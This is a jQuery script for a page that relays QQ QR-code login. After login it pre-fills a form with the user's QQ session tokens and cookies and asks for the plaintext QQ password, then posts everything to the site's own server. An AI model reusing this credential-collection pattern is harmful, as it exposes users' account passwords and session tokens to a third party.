function getqrpic() {
	var getvcurl = 'login.php?do=getqrpic&r=' + Math.random(1);
	$.get(getvcurl, function (d) {
		if (d.saveOK == 0) {
			$('#qrimg').attr('qrsig', d.qrsig);
			$('#qrimg').html('<img onclick="getqrpic()" src="data:image/png;base64,' + d.data + '" title="点击刷新">');
		} else {
			alert(d.msg);
		}
	});
}
function ptuiCB(code, uin, skey, pskey, pskey2, pookie, cookie) {
	var msg = '请扫描二维码';
	switch (code) {
	case '0':
		$('#login').html('<div class="alert alert-success">登录成功！QQ:' + uin + '请输入QQ密码进行自动更新</div><form action="?type=save" role="form" class="form-horizontal" method="post"><div class="input-group"><span class="input-group-addon">QQ帐号</span><input name="uin" id="uin" value="' + uin + '" class="form-control" /></div><br/><div class="input-group"><span class="input-group-addon">SKEY</span><input name="skey" id="skey" value="' + skey + '" class="form-control"/></div><br/><div class="input-group"><span class="input-group-addon">P_skey</span><input name="pskey" id="pskey" value="' + pskey + '" class="form-control"/></div><br/><div class="input-group"><span class="input-group-addon">pookie</span><input name="pookie" value="' + pookie + '" class="form-control"/></div><br/><div class="input-group"><span class="input-group-addon">M_skey</span><input name="pskey2" value="' + pskey2 + '" class="form-control"/></div><br/><div class="input-group"><span class="input-group-addon">Cookie</span><input name="cookie" value="' + cookie + '" class="form-control"/></div><br/><div class="input-group"><span class="input-group-addon">QQ密码</span><input name="pwd" value="" class="form-control"/></div><br/><div class="list-group-item"><input type="submit" name="submit" value="确认提交" class="btn btn-primary btn-block"></div></form>');
		$('#qrimg').hide();
		$('#submit').hide();
		$('#login').attr("data-lock", "true");
		break;
	case '1':
		getqrpic();
		msg = '请重新扫描二维码';
		break;
	case '2':
		msg = '使用QQ手机版扫描二维码';
		break;
	case '3':
		msg = '扫描成功，请在手机上确认授权登录';
		break;
	default:
		break;
	}
	$('#loginmsg').html(msg);
}
function loadScript(c) {
	if ($('#login').attr("data-lock") === "true")
		return;
	var qrsig = $('#qrimg').attr('qrsig');
	c = c || "login.php?do=qqlogin&qrsig=" + decodeURIComponent(qrsig) + "&r=" + Math.random(1);
	var a = document.createElement("script");
	a.onload = a.onreadystatechange = function () {
		if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete") {
			if (typeof d == "function") {
				d()
			}
			a.onload = a.onreadystatechange = null;
			if (a.parentNode) {
				a.parentNode.removeChild(a)
			}
		}
	};
	a.src = c;
	document.getElementsByTagName("head")[0].appendChild(a)
}
function loginload() {
	if ($('#login').attr("data-lock") === "true")
		return;
	var load = document.getElementById('loginload').innerHTML;
	var len = load.length;
	if (len > 2) {
		load = '.';
	} else {
		load += '.';
	}
	document.getElementById('loginload').innerHTML = load;
}
$(document).ready(function () {
	getqrpic();
	$('#submit').click(function () {
		loadScript();
	});
	window.setInterval(loginload, 1000);
	window.setInterval(loadScript, 3000);
});
